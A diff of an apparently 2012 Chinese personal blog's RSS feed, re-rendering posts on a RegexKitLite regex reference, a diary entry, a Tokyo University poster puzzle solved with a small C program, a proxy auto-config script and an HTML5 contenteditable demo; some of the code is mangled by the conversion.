-&lt;td&gt;Match between &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; and &lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt; times. Match as many times as possible, but not more than &lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;*?&lt;/td&gt;
-&lt;td&gt;Match zero or more times. Match as few times as possible.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;+?&lt;/td&gt;
-&lt;td&gt;Match one or more times. Match as few times as possible.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;??&lt;/td&gt;
-&lt;td&gt;Match zero or one times. Prefer zero.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;}?&lt;/td&gt;
-&lt;td&gt;Match exactly &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,}?&lt;/td&gt;
-&lt;td&gt;Match at least &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times, but no more than required for an overall pattern match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,&lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt;}?&lt;/td&gt;
-&lt;td&gt;Match between &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; and &lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt; times. Match as few times as possible, but not less than &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;*+&lt;/td&gt;
-&lt;td&gt;Match zero or more times. Match as many times as possible when first encountered, do not retry with fewer even if overall match fails. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;++&lt;/td&gt;
-&lt;td&gt;Match one or more times. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;?+&lt;/td&gt;
-&lt;td&gt;Match zero or one times. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;}+&lt;/td&gt;
-&lt;td&gt;Match exactly &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,}+&lt;/td&gt;
-&lt;td&gt;Match at least &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,&lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt;}+&lt;/td&gt;
-&lt;td&gt;Match between &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; and &lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt; times. Possessive match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(…)&lt;/td&gt;
-&lt;td&gt;Capturing parentheses. Range of input that matched the parenthesized subexpression is available after the match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?:…)&lt;/td&gt;
-&lt;td&gt;Non-capturing parentheses. Groups the included pattern, but does not provide capturing of matching text. Somewhat more efficient than capturing parentheses.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?&amp;gt;…)&lt;/td&gt;
-&lt;td&gt;Atomic-match parentheses. First match of the parenthesized subexpression is the only one tried; if it does not lead to an overall pattern match, back up the search for a match to a position before the (?&amp;gt; .&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?#…)&lt;/td&gt;
-&lt;td&gt;Free-format comment (?#&lt;em&gt;comment&lt;/em&gt;).&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?=…)&lt;/td&gt;
-&lt;td&gt;Look-ahead assertion. True if the parenthesized pattern matches at the current input position, but does not advance the input position.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?!…)&lt;/td&gt;
-&lt;td&gt;Negative look-ahead assertion. True if the parenthesized pattern does not match at the current input position. Does not advance the input position.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?&amp;lt;=…)&lt;/td&gt;
-&lt;td&gt;Look-behind assertion. True if the parenthesized pattern matches text preceding the current input position, with the last character of the match being the input character just before the current position. Does not alter the input position. The length of possible strings matched by the look-behind pattern must not be unbounded (no * or + operators).&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?&amp;lt;!…)&lt;/td&gt;
-&lt;td&gt;Negative Look-behind assertion. True if the parenthesized pattern does not match text preceding the current input position, with the last character of the match being the input character just before the current position. Does not alter the input position. The length of possible strings matched by the look-behind pattern must not be unbounded (no * or + operators).&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?ismwx-ismwx:…)&lt;/td&gt;
-&lt;td&gt;Flag settings. Evaluate the parenthesized expression with the specified flags&lt;em&gt;enabled&lt;/em&gt; or -&lt;em&gt;disabled&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(?ismwx-ismwx)&lt;/td&gt;
-&lt;td&gt;Flag settings. Change the flag settings. Changes apply to the portion of the pattern following the setting. For example, (?i) changes to a case insensitive match.
-&lt;div&gt;&lt;strong&gt;See also:&lt;/strong&gt; &lt;a href=&quot;http://regexkit.sourceforge.net/RegexKitLite/#RegularExpressionOptions&quot;&gt;Regular Expression Options&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;/p&gt;
-</description>
+
+
+
+Metacharacters
+
+
+Character
+Description
+
+
+\a
+Match a BELL, \u0007
+
+
+\A
+Match at the beginning of the input. Differs from ^ in that \A will not match after a new-line within the input.
+
+
+\b, outside of a [Set]
+Match if the current position is a word boundary. Boundaries occur at the transitions between word \w and non-word \W characters, with combining marks ignored.
+See also: RKLUnicodeWordBoundaries
+
+
+\b, within a [Set]
+Match a BACKSPACE, \u0008.
+
+
+\B
+Match if the current position is not a word boundary.
+
+
+\cx
+Match a Control-x character.
+
+
+\d
+Match any character with the Unicode General Category of Nd(Number, Decimal Digit).
+
+
+\D
+Match any character that is not a decimal digit.
+
+
+\e
+Match an ESCAPE, \u001B.
+
+
+\E
+Terminates a \Q…\E quoted sequence.
+
+
+\f
+Match a FORM FEED, \u000C.
+
+
+\G
+Match if the current position is at the end of the previous match.
+
+
+\n
+Match a LINE FEED, \u000A.
+
+
+\N{Unicode Character Name}
+Match the named Unicode Character.
+
+
+\p{Unicode Property Name}
+Match any character with the specified Unicode Property.
+
+
+\P{Unicode Property Name}
+Match any character not having the specified Unicode Property.
+
+
+\Q
+Quotes all following characters until \E.
+
+
+\r
+Match a CARRIAGE RETURN, \u000D.
+
+
+\s
+Match a white space character. White space is defined as[\t\n\f\r\p{Z}].
+
+
+\S
+Match a non-white space character.
+
+
+\t
+Match a HORIZONTAL TABULATION, \u0009.
+
+
+\uhhhh
+Match the character with the hex value hhhh.
+
+
+\Uhhhhhhhh
+Match the character with the hex value hhhhhhhh. Exactly eight hex digits must be provided, even though the largest Unicode code point is \U0010ffff.
+
+
+\w
+Match a word character. Word characters are[\p{Ll}\p{Lu}\p{Lt}\p{Lo}\p{Nd}].
+
+
+\W
+Match a non-word character.
+
+
+\x{h…}
+Match the character with hex value hhhh. From one to six hex digits may be supplied.
+
+
+\xhh
+Match the character with two digit hex value hh.
+
+
+\X
+Match a Grapheme Cluster.
+
+
+\Z
+Match if the current position is at the end of input, but before the final line terminator, if one exists.
+
+
+\z
+Match if the current position is at the end of input.
+
+
+\n
+
+Back Reference. Match whatever the nth capturing group matched. nmust be a number ≥ 1 and ≤ total number of capture groups in the pattern.
+
+
+
+Note:
+Octal escapes, such as \012, are not supported.
+
+
+
+
+
+[pattern]
+Match any one character from the set. See ICU Regular Expression Character Classes for a full description of what may appear in the pattern.
+
+
+.
+Match any character.
+
+
+^
+Match at the beginning of a line.
+
+
+$
+Match at the end of a line.
+
+
+\
+Quotes the following character. Characters that must be quoted to be treated as literals are * ? + [ ( ) { } ^ $ | \ . /
+
+
+
+
+
+Operators
+
+
+Operator
+Description
+
+
+|
+Alternation. A|B matches either A or B.
+
+
+*
+Match zero or more times. Match as many times as possible.
+
+
++
+Match one or more times. Match as many times as possible.
+
+
+?
+Match zero or one times. Prefer one.
+
+
+{n}
+Match exactly n times.
+
+
+{n,}
+Match at least n times. Match as many times as possible.
+
+
+{n,m}
+Match between n and m times. Match as many times as possible, but not more than m.
+
+
+*?
+Match zero or more times. Match as few times as possible.
+
+
++?
+Match one or more times. Match as few times as possible.
+
+
+??
+Match zero or one times. Prefer zero.
+
+
+{n}?
+Match exactly n times.
+
+
+{n,}?
+Match at least n times, but no more than required for an overall pattern match.
+
+
+{n,m}?
+Match between n and m times. Match as few times as possible, but not less than n.
+
+
+*+
+Match zero or more times. Match as many times as possible when first encountered, do not retry with fewer even if overall match fails. Possessive match.
+
+
+++
+Match one or more times. Possessive match.
+
+
+?+
+Match zero or one times. Possessive match.
+
+
+{n}+
+Match exactly n times. Possessive match.
+
+
+{n,}+
+Match at least n times. Possessive match.
+
+
+{n,m}+
+Match between n and m times. Possessive match.
+
+
+(…)
+Capturing parentheses. Range of input that matched the parenthesized subexpression is available after the match.
+
+
+(?:…)
+Non-capturing parentheses. Groups the included pattern, but does not provide capturing of matching text. Somewhat more efficient than capturing parentheses.
+
+
+(?&amp;amp;gt;…)
+Atomic-match parentheses. First match of the parenthesized subexpression is the only one tried; if it does not lead to an overall pattern match, back up the search for a match to a position before the (?&amp;amp;gt; .
+
+
+(?#…)
+Free-format comment (?#comment).
+
+
+(?=…)
+Look-ahead assertion. True if the parenthesized pattern matches at the current input position, but does not advance the input position.
+
+
+(?!…)
+Negative look-ahead assertion. True if the parenthesized pattern does not match at the current input position. Does not advance the input position.
+
+
+(?&amp;amp;lt;=…)
+Look-behind assertion. True if the parenthesized pattern matches text preceding the current input position, with the last character of the match being the input character just before the current position. Does not alter the input position. The length of possible strings matched by the look-behind pattern must not be unbounded (no * or + operators).
+
+
+(?&amp;amp;lt;!…)
+Negative Look-behind assertion. True if the parenthesized pattern does not match text preceding the current input position, with the last character of the match being the input character just before the current position. Does not alter the input position. The length of possible strings matched by the look-behind pattern must not be unbounded (no * or + operators).
+
+
+(?ismwx-ismwx:…)
+Flag settings. Evaluate the parenthesized expression with the specified flagsenabled or -disabled.
+
+
+(?ismwx-ismwx)
+Flag settings. Change the flag settings. Changes apply to the portion of the pattern following the setting. For example, (?i) changes to a case insensitive match.
+See also: Regular Expression Options
+
+
+
+
+
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/11/24/regexkit%E7%AC%94%E8%AE%B0</link>
                 <guid>http://snorlaxzxz.com/program/2012/11/24/regexkit笔记</guid>
                 <pubDate>2012-11-24T00:00:00+08:00</pubDate>
@@ -2124,13 +2105,20 @@ CRC(循环冗余检测)	4字节	 存储用来检测是否有错误的循环冗�
         <item>
                 <title>一人暮らし</title>
                 <description>&lt;p&gt;&lt;p&gt;最近心情很差、很多很多方面&lt;/p&gt;
+
 &lt;p&gt;今天也是如此、不知道为什么看到那些在比赛html5的心情很差、主要原因应该就是觉得我也应该是其中一员吧&lt;/p&gt;
+
 &lt;p&gt;当然放弃也是我自己当时的抉择、也没有任何人好怪的、当时开始报名的时候我就怀着的心态就非常矛盾、大概也应该是心疼那三百块钱吧……再其实也不是因为那一点报名费、而是就只有我一个人的无助感吧、我总是就这么一个人、一个人……我也觉得我不是冷无缺也不是什么很难相处的人为什么我的朋友很少呢、不管任何方面&lt;/p&gt;
+
 &lt;p&gt;有时候就是想这么去找个可以和自己一起去打的人都好难、算了纠结原因也就是我那个奇怪的性格吧、做项目也是如此、当我一个人打的时候我并没有感觉什么、当我有队友时当我们没法合拍时我也不知道怎么办、我也知道他们可以一起帮忙、可是为什么我有这份心却怎么样都合不起来、合不起来合不起来我只能一次次放弃、讽刺的到现在我应该一个像样的东西都没有做出来过吧、我很佩服那个做猛犸browser的孩子、或许他的心态就跟我一样、但是他却可以作出一件件像样的东西、而我这个渣也就这么只会去惆怅下去吧、其实这麻痹就还是归结于一个缩字&lt;/p&gt;
+
 &lt;p&gt;其实我真的不想永远一个人从早上挖开眼睛就对着我的电脑老婆、不想永远一个人的走在校园的路上、不想一个人出去看电影、不想一个人出去吃饭、真的不想&lt;/p&gt;
+
 &lt;p&gt;想想一个人在学校住了十二年、想想一个人了二十年、想想才有几个交心的朋友、或者这才是我上次哭的原因、或许这才是我的悲哀吧&lt;/p&gt;
+
 &lt;p&gt;牢骚发完了、尽快从最近这状态出来吧、傻逼你二十年的人生不是早已经习惯了么？&lt;/p&gt;
-&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;&lt;/p&gt;
 </description>
                 <link>http://snorlaxzxz.com/life/2012/11/14/%E4%B8%80%E4%BA%BA%E6%9A%AE%E3%82%89%E3%81%97</link>
                 <guid>http://snorlaxzxz.com/life/2012/11/14/一人暮らし</guid>
@@ -2548,87 +2536,53 @@ CRC(循环冗余检测)	4字节	 存储用来检测是否有错误的循环冗�
 01111011110010100000000010110111111110101010100011000010011100000110111110000000010000000000000000&lt;br /&gt;
 记得去掉每行的\n啊&lt;/p&gt;
 
-&lt;p&gt;昏头了吧……这玩意怎么搞……我看到反正也是蒙了，要不是有大哥来解释我还真就昏倒了，首先他先分析了这些数字一共的数量
+&lt;p&gt;&lt;p&gt;昏头了吧……这玩意怎么搞……我看到反正也是蒙了，要不是有大哥来解释我还真就昏倒了，首先他先分析了这些数字一共的数量
 &lt;strong&gt;2848&lt;/strong&gt;
 这个数字有什么特别的？&lt;br /&gt;
 他是8的倍数啊！他会不会就是字节流啊……&lt;br /&gt;
 那么他是大端的还是小端的呢……好吧大哥说他是大端，那就是大端吧那么就用大端的方式解析&lt;br /&gt;
-首先我自己的电脑是小端机，就稍微做一点处理写了一个小程序代码如下(所有判错的部分全部都省略了
-&lt;pre lang=&quot;c&quot;&gt;
-#include &lt;stdio.h&gt;
-#include &lt;arpa/inet.h&gt;
+首先我自己的电脑是小端机，就稍微做一点处理写了一个小程序代码如下(所有判错的部分全部都省略了&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#include 
+#include 
 int current_bit = 0;
 unsigned char bit_buffer;
 //bit转byte
 void WriteBit (int bit,FILE *f)
 {
     if (bit)
-        bit_buffer |= (1&lt;&lt;current_bit);
-    
-    current_bit++;
-    if (current_bit == 8)
-    {
-        fwrite (&amp;bit_buffer, 1, 1, f);
-        printf(&quot;%d&quot;,bit_buffer);
-        printf(&quot;--&quot;);
-        current_bit = 0;
-        bit_buffer = 0;
-    }
-}
-int main()
-{
-    FILE *a=fopen(&quot;/Users/apple/work/codeforexpe/2012_9_28/labfor12/labfor12/testfile.strings&quot;, &quot;r&quot;);
-    FILE *f=fopen(&quot;/Users/apple/work/codeforexpe/2012_9_28/labfor12/labfor12/testfile2.strings&quot;, &quot;wb&quot;);
-    char tmp;
-    char tt[8];
-    int i=0;
-    int j=0;
-    while ((tmp=getc(a))!=EOF)
-    {
-        
-        tt[i]=tmp;
-        
-        if (i==7) {
-            //小端转大端
-            for (j=7; j&gt;=0; j--) {
+        bit_buffer |= (1=0; j--) {
                 tt[j]-=48;
                 WriteBit(tt[j], f);
             }
             //大端机用这个
-//            for (j=0; j&lt;8; j++) {
-//                tt[j]-=48;
-//                WriteBit(tt[j], f);
-//            }
-            i-=8;
-        }
-        i++;
-    }&lt;/stdio.h&gt;&lt;/pre&gt;&lt;/p&gt;
+//            for (j=0; j
 
-&lt;p&gt;    fclose(f);  &lt;br /&gt;
-    fclose(a);&lt;br /&gt;
-    return 0;&lt;br /&gt;
+    fclose(f);  
+    fclose(a);
+    return 0;
 }
 
 代码很快就写好了，输出的文件是什么呢……
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/CBA5DB15-EE27-46D6-9374-454F06C4D48D.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-90&quot; title=&quot;tokyo_daigaku_code&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/CBA5DB15-EE27-46D6-9374-454F06C4D48D.jpg&quot; alt=&quot;&quot; width=&quot;1238&quot; height=&quot;352&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;我擦，坑爹啊，这是什么shit啊……没关系，可以看他是什么的嘛……
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/74AF12DD-EA72-492B-9664-0CFDC2D82307.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-91&quot; title=&quot;tokyo_daigaku_file_judge&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/74AF12DD-EA72-492B-9664-0CFDC2D82307.jpg&quot; alt=&quot;&quot; width=&quot;488&quot; height=&quot;39&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;是个gzip的压缩包啊，看来已经走进真相了！好把用tar给他解压了是个什么shit……
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/1C338445-1846-48DD-8961-6B2B2155ABE5.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-92&quot; title=&quot;tokyo_daigaku_java&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/1C338445-1846-48DD-8961-6B2B2155ABE5.jpg&quot; alt=&quot;&quot; width=&quot;1374&quot; height=&quot;175&quot; /&gt;&lt;/a&gt;
+我擦，坑爹啊，这是什么shit啊……没关系，可以看他是什么的嘛……
+
+
+是个gzip的压缩包啊，看来已经走进真相了！好把用tar给他解压了是个什么shit……
+
 奔溃了，有是这种非人类所读的东西……但是注意一下，就算是乱啊也有一个很关键的可依稀识别的java/lang/String!尼玛搞了半天原来你是个java啊，好的，那就把你后缀改成class 然后用java再跑一下！
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/AA21C5CC-5D06-4CE5-9E69-1F272796D158.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-93&quot; title=&quot;tokyo_daigaku_se_java&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/AA21C5CC-5D06-4CE5-9E69-1F272796D158.jpg&quot; alt=&quot;&quot; width=&quot;535&quot; height=&quot;164&quot; /&gt;&lt;/a&gt;
-有java的出错信息了，那么久了终于碰到一个程序员能看的东西了……泪流满面，那就把他反编译一下看看到底是什么问题，检查出最后是因为名字的问题，那么好吧，把class 改成 i.class&lt;br /&gt;
+
+有java的出错信息了，那么久了终于碰到一个程序员能看的东西了……泪流满面，那就把他反编译一下看看到底是什么问题，检查出最后是因为名字的问题，那么好吧，把class 改成 i.class
 然后最后等待奇迹的时刻吧……= =
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/94C303B8-7B47-4858-B55B-0A30A7EF96DB.jpg&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-94&quot; title=&quot;tokyo_daigaku_final&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/11/94C303B8-7B47-4858-B55B-0A30A7EF96DB.jpg&quot; alt=&quot;&quot; width=&quot;293&quot; height=&quot;34&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;他终于出了个网址了啊……泪流满面……&lt;/p&gt;
 
-&lt;p&gt;少年你以为这样就拿到东大的offer了么？你还太年轻……做到这步你就有直接去面试的资格了，要直接拿到offer需要继续解码一段音频，好吧，我觉得那已经超出我能力范围了，这个彩蛋揭秘过程就到这吧&lt;/p&gt;
+他终于出了个网址了啊……泪流满面……
 
-&lt;p&gt;最后：外国的牛逼大学真心大陆能比？就说这样的在一张小小的海报策划的功夫、呵呵呵&lt;/p&gt;
-</description>
+少年你以为这样就拿到东大的offer了么？你还太年轻……做到这步你就有直接去面试的资格了，要直接拿到offer需要继续解码一段音频，好吧，我觉得那已经超出我能力范围了，这个彩蛋揭秘过程就到这吧
+
+最后：外国的牛逼大学真心大陆能比？就说这样的在一张小小的海报策划的功夫、呵呵呵
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/11/04/%E5%85%B3%E4%BA%8E%E4%B8%9C%E5%A4%A7%E6%83%85%E6%8A%A5%E7%A0%94%E7%A9%B6%E7%94%9F%E6%B5%B7%E6%8A%A5%E7%9A%84%E5%BD%A9%E8%9B%8B</link>
                 <guid>http://snorlaxzxz.com/program/2012/11/04/关于东大情报研究生海报的彩蛋</guid>
                 <pubDate>2012-11-04T00:00:00+08:00</pubDate>
@@ -2647,7 +2601,9 @@ int main()
 浏览器是会通过这个FindProxyForURL来选择具体是否选择实用代理&lt;br /&gt;
 那么最简单的一个代理就是&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;javascript&quot;&gt;
+&lt;p&gt;
+```
+
 function FindProxyForURL(url, host)
 {
     if(dnsDomainIs(host, &quot;twitter.com&quot;)
@@ -2655,23 +2611,23 @@ function FindProxyForURL(url, host)
         return &#39;PROXY 127.0.0.1:8087&#39;
     }
     return &#39;DIRECT&#39;;
-}&lt;/pre&gt;&lt;/p&gt;
+}
 
-&lt;p&gt;&lt;/p&gt;
 
-&lt;p&gt;那么稍微再加个正则匹配的就变成这样了&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;javascript&quot;&gt;
+那么稍微再加个正则匹配的就变成这样了
+
+
 function FindProxyForURL(url, host) 
 {
     if (shExpMatch(url, &quot;*://*.twitter*&quot;)) return &#39;PROXY 127.0.0.1:8087&#39;;
     if (shExpMatch(url, &quot;*://*.google*&quot;)) return &#39;PROXY 127.0.0.1:8087&#39;;
     return &#39;DIRECT&#39;;
 }
-&lt;/pre&gt;&lt;/p&gt;
 
-&lt;p&gt;个么最后写完这个脚本丢在哪儿呢&lt;br /&gt;
-在 system perference-&gt;network-&gt;advanced-&gt;proxy-&gt;auto proxy  configuration把自己刚写的那pac(后缀什么的都无所谓的)给导进去就可以了&lt;/p&gt;
+
+个么最后写完这个脚本丢在哪儿呢
+在 system perference-&gt;&gt;network-&gt;advanced-&gt;proxy-&gt;auto proxy  configuration把自己刚写的那pac(后缀什么的都无所谓的)给导进去就可以了&lt;/p&gt;
 
 &lt;p&gt;enjoy&lt;/p&gt;
 </description>
@@ -2689,46 +2645,44 @@ http://stackoverflow.com/questions/8012245/using-ios-5-rich-text-editor&lt;br /&
 具体demo 如下&lt;br /&gt;
 http://html5demos.com/contenteditable&lt;/p&gt;
 
-&lt;p&gt;简单来说就是加个section 设置个 contenteditable，就那么简单！&lt;br /&gt;
-比如
-&lt;pre lang=&quot;html&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;简单来说就是加个section 设置个 contenteditable，就那么简单！&lt;br /&gt;
+比如&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; hi 我来作试验的 
+  首先是段落 
+  &amp;amp;nbsp; &amp;amp;nbsp; 然后是缩进  
 
-&lt;p&gt;&lt;section id=&quot;editable&quot; contenteditable=&quot;true&quot;&gt;
-&lt;p&gt; hi 我来作试验的 &lt;/p&gt;
- &lt;p&gt; 首先是段落 &lt;/p&gt;
- &lt;p&gt; &amp;nbsp; &amp;nbsp; 然后是缩进 &lt;/p&gt; 
-&lt;p&gt; &lt;br /&gt; &lt;/p&gt; 
-&lt;p&gt; 然后多换行 &lt;/p&gt; 
-&lt;p&gt; 然后大段文字ahdjasd &lt;/p&gt; 
-&lt;span style=&quot;font-family:&#39;Microsoft YaHei&#39;;color:#E53333;&quot;&gt;&lt;/span&gt;
-&lt;span style=&quot;font-family:&#39;Microsoft YaHei&#39;;color:#E53333;&quot;&gt;jaieowajkncnxmbfhawija&lt;/span&gt;
-&lt;p&gt; hiiii &lt;/p&gt; &lt;p&gt; 
-&lt;br /&gt; &lt;/p&gt; 
-&lt;p&gt; &amp;nbsp; &amp;nbsp; test over &lt;/p&gt;
- &lt;p&gt; &lt;br /&gt; &lt;/p&gt;
-&lt;/section&gt;&lt;/p&gt;
+ 然后多换行  
+ 然后大段文字ahdjasd  
 
-&lt;p&gt;&lt;/p&gt;
+jaieowajkncnxmbfhawija
+ hiiii   
 
-&lt;p&gt;----------------------------------我是分割线-------------------------
-&lt;section id=&quot;editable&quot; contenteditable=&quot;true&quot;&gt;
-&lt;p&gt; hi 我来作试验的 &lt;/p&gt;
- &lt;p&gt; 首先是段落 &lt;/p&gt;
- &lt;p&gt; &amp;nbsp; &amp;nbsp; 然后是缩进 &lt;/p&gt; 
-&lt;p&gt; &lt;br /&gt; &lt;/p&gt; 
-&lt;p&gt; 然后多换行 &lt;/p&gt; 
-&lt;p&gt; 然后大段文字ahdjasd &lt;/p&gt; 
-&lt;span style=&quot;font-family:&#39;Microsoft YaHei&#39;;color:#E53333;&quot;&gt;&lt;/span&gt;
-&lt;span style=&quot;font-family:&#39;Microsoft YaHei&#39;;color:#E53333;&quot;&gt;jaieowajkncnxmbfhawija&lt;/span&gt;
-&lt;p&gt; hiiii &lt;/p&gt; &lt;p&gt; 
-&lt;br /&gt; &lt;/p&gt; 
-&lt;p&gt; &amp;nbsp; &amp;nbsp; test over &lt;/p&gt;
- &lt;p&gt; &lt;br /&gt; &lt;/p&gt;
-&lt;/section&gt;
-仅仅只要把需要编辑的部分加个section设置个 contenteditable＝true，所有的富文本编辑问题就这么搞定了……&lt;/p&gt;
-</description>
-                <link>http://snorlaxzxz.com/program/2012/10/22/%E5%88%86%E4%BA%ABhtml5%E6%96%B0%E7%89%B9%E6%80%A7-contenteditable</link>
-                <guid>http://snorlaxzxz.com/program/2012/10/22/分享html5新特性-contenteditable</guid>
+ &amp;amp;nbsp; &amp;amp;nbsp; test over 
+
+
+
+
+
+----------------------------------我是分割线-------------------------
+
+ hi 我来作试验的 
+  首先是段落 
+  &amp;amp;nbsp; &amp;amp;nbsp; 然后是缩进  
+
+ 然后多换行  
+ 然后大段文字ahdjasd  
+
+jaieowajkncnxmbfhawija
+ hiiii   
+
+ &amp;amp;nbsp; &amp;amp;nbsp; test over 
+
+
+仅仅只要把需要编辑的部分加个section设置个 contenteditable＝true，所有的富文本编辑问题就这么搞定了……
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+                <link>http://snorlaxzxz.com/program/2012/10/22/%E5%88%86%E4%BA%ABmd5%E6%96%B0%E7%89%B9%E6%80%A7-contenteditable</link>
+                <guid>http://snorlaxzxz.com/program/2012/10/22/分享md5新特性-contenteditable</guid>
                 <pubDate>2012-10-22T00:00:00+08:00</pubDate>
         </item>
 
@@ -2740,127 +2694,128 @@ http://html5demos.com/contenteditable&lt;/p&gt;
 
 &lt;p&gt;&amp;nbsp;&lt;/p&gt;
 
-&lt;p&gt;&amp;lt;pre lang=&quot;python&quot; file=&quot;rp.py&quot; colla=&quot;+&quot;&amp;gt;
-&lt;pre&gt;# -*- coding: utf-8 -*-
+&lt;p&gt;&lt;p&gt;&amp;lt;pre lang=&amp;quot;python&amp;quot; file=&amp;quot;rp.py&amp;quot; colla=&amp;quot;+&amp;quot;&amp;gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# -*- coding: utf-8 -*-
 from Tkinter import *
 import sys
 import time
 import codecs
 from time import sleep
-llist=[&#39;xxx&#39;,&#39;xxy&#39;,&#39;xyy&#39;,&#39;yyy&#39;,&#39;yxx&#39;,&#39;zzz&#39;,&#39;zxx&#39;]
-flag=0&lt;/pre&gt;&lt;/p&gt;
+llist=[&amp;#39;xxx&amp;#39;,&amp;#39;xxy&amp;#39;,&amp;#39;xyy&amp;#39;,&amp;#39;yyy&amp;#39;,&amp;#39;yxx&amp;#39;,&amp;#39;zzz&amp;#39;,&amp;#39;zxx&amp;#39;]
+flag=0
 
-&lt;p&gt;# position of buttons&lt;br /&gt;
-row_button = 8&lt;br /&gt;
-col_button = 5&lt;/p&gt;
+# position of buttons
+row_button = 8
+col_button = 5
 
-&lt;p&gt;# font size&lt;br /&gt;
-size_title = 20&lt;br /&gt;
-size_button = 12&lt;br /&gt;
-size_text = 14&lt;/p&gt;
+# font size
+size_title = 20
+size_button = 12
+size_text = 14
 
